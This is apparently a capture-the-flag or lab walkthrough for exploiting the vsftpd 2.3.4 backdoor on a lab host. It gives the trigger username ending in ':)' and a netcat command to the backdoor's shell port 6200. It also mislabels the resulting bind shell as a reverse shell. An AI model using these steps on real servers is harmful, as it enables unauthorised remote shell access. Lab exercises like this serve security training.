Walkthrough: FTP-vuln

This lab features a vulnerable version of vsftpd 2.3.4, which contains a backdoor that listens on port 6200 after a special login attempt.

Objective

Gain a reverse shell by exploiting the vsftpd backdoor.

Step-by-Step Instructions
  1. Connect to the FTP server: 
    ftp 10.42.17.26
  2. When prompted for a username, enter: 
    user: user:)

    The :) triggers the backdoor.

  3. You should now see a shell listener on port 6200.
  4. Connect to it using netcat: 
    nc 10.42.17.26 6200
  5. You now have a shell!
